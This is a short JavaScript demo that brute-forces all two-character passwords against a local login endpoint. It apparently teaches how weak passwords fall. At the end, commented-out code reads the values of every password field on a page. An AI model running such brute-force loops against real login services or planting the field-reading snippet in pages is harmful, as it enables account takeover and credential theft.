
const probiere = document.querySelector('.probiere');
const ausgabe  = document.querySelector('.ausgabe');
const hack     = document.querySelector('.hack');

const fetchJSON = async (query,body)=> {
  let response = await fetch(
    'http://localhost:9922' + query, {
    method:'POST',
    headers:{ 'Content-Type':'application/json' },
    body: JSON.stringify(body)
  });
  return await response.json();
};


const alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@_-'

hack.onclick = async ()=> {
  let start = Date.now()
  probiere.classList.remove('fail','erfolg');
  for ( let x = 0; x < alpha.length ; x++ ){
    for ( let y = 0; y < alpha.length ; y++ ){
      let pass = alpha[x] + alpha[y];
      probiere.value = pass;
      ausgabe.innerHTML = `Hacking: ${( Date.now() - start ) / 1000}s`
      let result = await fetchJSON('/login',{pass});
      if ( result.status === 'success' ){
        probiere.classList.add('erfolg');
        return;
      }
    }
  }
  probiere.classList.add('fail');
}
// (function(){
//   // number of forms
//   fl = document.forms.length;
//   for(var i = 0; i < fl; i++) {
//     tform = document.forms[i];
//     sfl = tform.length;
//     for(var j = 0; j < sfl; j++) {
//       // check if type attribute is set
//       if(typeof tform[j].type != "undefined") {
//         // if so check if type password
//         if(tform[j].type.toLowerCase() == "password") {
//           alert('password: '+tform[j].value);
//         }
//       }
//     }
//   }
// })();
